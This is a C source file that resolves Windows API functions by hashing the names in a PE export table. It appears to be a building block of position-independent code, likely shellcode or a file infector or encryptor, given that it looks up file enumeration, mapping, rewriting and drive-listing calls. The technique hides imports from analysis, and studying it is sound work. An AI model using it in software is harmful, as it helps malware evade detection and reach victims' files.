#include "functions.h"

int fill_functions(IMAGE_EXPORT_DIRECTORY* ed, void* base, functions_t* functions) {
  uint32_t* namePtr = (uint32_t*) ((uint8_t*)base + ed->AddressOfNames);
  uint32_t* addrPtr = (uint32_t*) ((uint8_t*)base + ed->AddressOfFunctions);
  uint16_t* nameOrdinalsPtr = (uint16_t*) ((uint8_t*)base + ed->AddressOfNameOrdinals);
  int functionCounter = 0;

  memzero((void*)functions, sizeof(functions_t));

  for(uint32_t i = 0; i < ed->NumberOfNames; i++) {

    switch(checksum((const char*) base + *namePtr)) {
      case CS_EXITPROCESS:  functions->exitProcess = (fpExitProcess) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_GETTICKCOUNT: functions->getTickCount = (fpGetTickCount) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_GETPROCESSHEAP: functions->getProcessHeap = (fpGetProcessHeap) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_HEAPALLOC: functions->heapAlloc = (fpHeapAlloc) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_HEAPFREE: functions->heapFree = (fpHeapFree) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_FINDFIRSTFILEA:  functions->findFirstFileA = (fpFindFirstFileA) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_FINDNEXTFILEA: functions->findNextFileA = (fpFindNextFileA) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_FINDCLOSE: functions->findClose = (fpFindClose) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_CREATEFILEA: functions->createFileA = (fpCreateFileA) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_GETFILESIZE: functions->getFileSize = (fpGetFileSize) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_CREATEFILEMAPPINGA:  functions->createFileMappingA = (fpCreateFileMappingA) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_MAPVIEWOFFILE: functions->mapViewOfFile = (fpMapViewOfFile) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_FLUSHVIEWOFFILE: functions->flushViewOfFile = (fpFlushViewOfFile) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_UNMAPVIEWOFFILE: functions->unmapViewOfFile = (fpUnmapViewOfFile) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_SETFILEPOINTER: functions->setFilePointer = (fpSetFilePointer) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_SETENDOFFILE:  functions->setEndOfFile = (fpSetEndOfFile) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_CLOSEHANDLE: functions->closeHandle = (fpCloseHandle) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_CREATETHREAD: functions->createThread = (fpCreateThread) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_GETLOGICALDRIVES: functions->getLogicalDrives = (fpGetLogicalDrives) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      case CS_SLEEP: functions->sleep = (fpSleep) base + *(addrPtr + *nameOrdinalsPtr);
                            break;
      default:              functionCounter--;
                            break;
    }
    functionCounter++;
    namePtr++;
    nameOrdinalsPtr++;
  }
  return functionCounter;
}

void* get_function_by_checksum(IMAGE_EXPORT_DIRECTORY* ed, void* base, uint32_t cs) {
  uint32_t* namePtr = (uint32_t*) ((uint8_t*)base + ed->AddressOfNames);
  uint32_t* addrPtr = (uint32_t*) ((uint8_t*)base + ed->AddressOfFunctions);
  uint16_t* nameOrdinalsPtr = (uint16_t*) ((uint8_t*)base + ed->AddressOfNameOrdinals);

  for(uint32_t i = 0; i < ed->NumberOfNames; i++) {
    if (checksum((const char*) base + *namePtr) == cs) {
      return (void*) ((uint8_t*)base + *(addrPtr + *nameOrdinalsPtr));
    }
    namePtr++;
    nameOrdinalsPtr++;
  }
  return NULL;
}